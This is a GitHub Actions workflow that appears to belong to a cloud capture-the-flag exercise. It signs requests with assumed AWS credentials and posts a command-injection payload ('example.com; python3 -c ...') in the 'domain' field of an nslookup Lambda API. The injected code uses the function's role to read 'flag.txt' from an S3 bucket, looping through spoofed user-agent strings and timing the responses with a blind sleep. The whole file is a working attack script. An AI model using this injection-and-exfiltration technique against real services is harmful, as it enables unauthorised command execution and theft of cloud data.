name: Stage2-20-Test-Real-Lambda-UserAgent

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Test User-Agents inside nslookupv2
        run: |
          python3 - <<'PY'
          import os
          import time
          import requests
          from requests_aws4auth import AWS4Auth

          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          user_agents = [
              "nslookupv2",
              "nslookup",
              "lambdaRole",
              "AWS_Lambda",
              "AWSLambda",
              "CloudEscape",
              "Amazon CloudFront",
              "aws-cli",
              "Boto3",
              "botocore"
          ]

          for user_agent in user_agents:
              python_code = (
                  "import boto3;"
                  "from botocore.config import Config;"
                  "s=boto3.client("
                  "'s3',"
                  "region_name='us-east-1',"
                  "endpoint_url='https://s3.us-east-1.amazonaws.com',"
                  "config=Config("
                  f"user_agent={user_agent!r},"
                  "s3={'addressing_style':'path'}"
                  ")"
                  ");"
                  "s.get_object("
                  "Bucket='logad88e2b168aa387e',"
                  "Key='flag.txt'"
                  ");"
              )

              injected = (
                  "example.com; "
                  "python3 -c "
                  + repr(python_code)
                  + " >/tmp/ua_result 2>&1 && sleep 8"
              )

              start = time.monotonic()

              response = requests.post(
                  api,
                  json={"domain": injected},
                  auth=auth,
                  timeout=30
              )

              elapsed = time.monotonic() - start

              print("UA=" + user_agent)
              print("HTTP=" + str(response.status_code))
              print("ELAPSED=%.2f" % elapsed)
              print("---")
          PY
